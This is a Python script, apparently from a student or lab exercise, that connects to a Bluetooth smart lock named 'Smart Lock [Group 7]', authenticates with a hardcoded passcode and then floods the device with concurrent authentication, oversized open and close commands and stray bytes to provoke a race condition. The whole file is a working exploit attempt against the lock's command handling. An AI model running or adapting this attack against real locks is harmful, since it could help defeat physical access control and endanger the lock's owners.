#!/usr/bin/env python3
import sys
import asyncio
from random import randint
from BLEClient import BLEClient
from UserInterface import ShowUserInterface

DEVICE_NAME = "Smart Lock [Group 7]"

# Commands
AUTH = [0x00]
OPEN = [0x01]
CLOSE = [0x02]
PASSCODE = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06]

async def fire_command_race(ble: BLEClient, command: list[int], id: int, repeat: int = 10):
    """Spams the BLE device with one command rapidly."""
    for i in range(repeat):
        # print(f"[Thread-{id}] Sending: {command}")
        await ble.write_command(command)
        # simulate random fluctuation in timing
        await asyncio.sleep(randint(0, 5) * 0.001)  # 0–5ms jitter

async def example_control_smartlock():
    ble = BLEClient()
    ble.init_logs()

    try:
        print(f'[1] Connecting to "{DEVICE_NAME}"...')
        await ble.connect(DEVICE_NAME)

        print("\n[2] Authenticating...")
        res = await ble.write_command(AUTH + PASSCODE)
        if res[0] != 0:
            print(f"[X] Failure: Wrong Passcode.")
            return

        print("[!] Authenticated!\n")
        print("[3] Launching race condition tasks...")

        tasks = []
        for i in range(5):
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, OPEN*255, id=2*i)))
            tasks.append(asyncio.create_task(fire_command_race(ble, CLOSE*256, id=2*i+1)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, AUTH + PASSCODE, id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, [0x3F], id=2*i+2)))
            tasks.append(asyncio.create_task(fire_command_race(ble, [0xAA,0xAA], id=2*i+2)))

        await asyncio.gather(*tasks)

    except Exception as e:
        print(f"[!] Exception occurred: {e}")

    finally:
        try:
            print("\n[4] Disconnecting...")
            await ble.disconnect()
        except Exception as e:
            print(f"[!] Failed to disconnect cleanly: {e}")

        print(f"\n[5] Logs from Smart Lock (Serial Port):\n{'-'*50}")
        try:
            lines = ble.read_logs()
            for line in lines:
                print(line)
        except Exception as e:
            print(f"[!] Error reading logs: {e}")

        sys.exit(0)

# Show User interface if command line contains --gui
if len(sys.argv) > 1 and sys.argv[1] == "--gui":
    ShowUserInterface()
else:
    try:
        asyncio.run(example_control_smartlock())
    except KeyboardInterrupt:
        print("\nProgram Exited by User!")
